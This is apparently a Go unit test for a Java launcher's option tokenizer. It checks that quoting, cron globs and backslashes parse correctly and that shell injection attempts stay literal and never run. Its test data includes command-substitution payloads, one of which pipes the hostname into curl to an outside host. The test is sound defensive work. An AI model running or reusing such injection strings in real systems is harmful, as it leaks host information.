package javaexec

import (
	"reflect"
	"testing"
)

func TestTokenizeJavaOpts(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want []string
	}{
		{"empty", "", nil},
		{"whitespace only", "   \t\n ", nil},
		{"simple", "-Xmx1g", []string{"-Xmx1g"}},
		{"two simple", "-Xmx1g -Xms512m", []string{"-Xmx1g", "-Xms512m"}},
		{"leading -n", "-n -Dfoo=bar", []string{"-n", "-Dfoo=bar"}},

		// Quoting: #1301 — quoted value with spaces stays a single argument.
		{"double-quoted spaces", `-Dfoo="bar baz"`, []string{"-Dfoo=bar baz"}},
		{"single-quoted spaces", `-Dfoo='bar baz'`, []string{"-Dfoo=bar baz"}},
		{"two quoted args", `-Dfoo="bar baz" -Dother="qux quux"`,
			[]string{"-Dfoo=bar baz", "-Dother=qux quux"}},

		// #1301 — cron with glob characters: one argument, '*' NOT expanded.
		{"cron quoted", `-DcronSched="0 */7 * * * *"`, []string{"-DcronSched=0 */7 * * * *"}},

		// Newlines (YAML block scalar) act as whitespace separators (issue #1259).
		{"newline separated", "-Xmx1g\n-Xms512m", []string{"-Xmx1g", "-Xms512m"}},

		// Shell metacharacters are treated as ordinary literal characters,
		// NOT operators (the launcher is not a shell). This is safe by design.
		{"ampersand literal", "-Dfoo=a&b", []string{"-Dfoo=a&b"}},
		{"pipe literal", "-Dx=a|b", []string{"-Dx=a|b"}},
		{"semicolon literal", "-Dx=a;b", []string{"-Dx=a;b"}},
		{"redirect literal", "-Dx=a>b", []string{"-Dx=a>b"}},

		// Security: command substitution is NOT executed; passed through literally
		// as a single token so the app does not crash with "class not found".
		{"command substitution unquoted", "-Dx=$(echo HACK)", []string{"-Dx=$(echo HACK)"}},
		{"command substitution with pipe", "-Dx=$(hostname | tr a b)", []string{"-Dx=$(hostname | tr a b)"}},
		{"command substitution nested parens", "-Dx=$(foo (bar))", []string{"-Dx=$(foo (bar))"}},
		// Quoted, it stays a single literal argument and is never executed.
		{"command substitution quoted", `-Dx="$(echo danger)"`, []string{"-Dx=$(echo danger)"}},
		{"backtick literal", "-Dx=`id`", []string{"-Dx=`id`"}},
		{"backtick with spaces", "-Dx=`hostname -f`", []string{"-Dx=`hostname -f`"}},

		// ${...} extended bash forms with spaces — pass literally to JVM as one token.
		{"brace default with spaces", "-Dx=${MY_VAR:-hello world}", []string{"-Dx=${MY_VAR:-hello world}"}},
		{"brace replacement with spaces", "-Dx=${MY_VAR//foo/bar baz}", []string{"-Dx=${MY_VAR//foo/bar baz}"}},
		{"brace simple no spaces", "-Dx=${MY_VAR}", []string{"-Dx=${MY_VAR}"}},
		{"brace nested braces in pattern", "-Dx=${MY_VAR//foo{bar}/baz qux}", []string{"-Dx=${MY_VAR//foo{bar}/baz qux}"}},
		{"brace assign default with spaces", "-Dx=${MY_VAR:=hello world}", []string{"-Dx=${MY_VAR:=hello world}"}},
		{"dollar var literal", "-Dx=$HOME", []string{"-Dx=$HOME"}},

		// Full manifest scenario (issue #1301 reproducer with all edge cases):
		//   -Dfoo="bar baz" -DcronSched="0 */7 * * * *" -Dbar=$HOME
		//   -Dwhere=$( hostname | tr '\n' | curl -v 'https://example.me')
		//   -Dmyfile=c:\\first\\second\\file.txt;ext
		// $HOME is already expanded by profile.d before javaexec sees it.
		{"full manifest scenario", `-Dfoo="bar baz" -DcronSched="0 */7 * * * *" -Dbar=/home/vcap/app -Dwhere=$( hostname | tr '\n' | curl -v 'https://example.me') -Dmyfile=c:\\first\\second\\file.txt;ext`,
			[]string{
				"-Dfoo=bar baz",
				"-DcronSched=0 */7 * * * *",
				"-Dbar=/home/vcap/app",
				`-Dwhere=$( hostname | tr '\n' | curl -v 'https://example.me')`,
				`-Dmyfile=c:\first\second\file.txt;ext`,
			}},

		// Backslash follows POSIX shell rules (parity with previous eval form):
		// unquoted backslash escapes the next character.
		{"escaped space joins", `a\ b`, []string{"a b"}},
		{"double backslash", `-Dpath=C:\\double`, []string{`-Dpath=C:\double`}},
		{"single-quoted backslashes literal", `-Dpath='C:\tmp\app'`, []string{`-Dpath=C:\tmp\app`}},

		// Empty quoted string yields an explicit empty argument.
		{"empty double quotes", `-Dfoo=""`, []string{"-Dfoo="}},
		{"standalone empty quotes", `'' x`, []string{"", "x"}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := TokenizeJavaOpts(tc.in)
			if !reflect.DeepEqual(got, tc.want) {
				t.Fatalf("TokenizeJavaOpts(%q) = %#v, want %#v", tc.in, got, tc.want)
			}
		})
	}
}
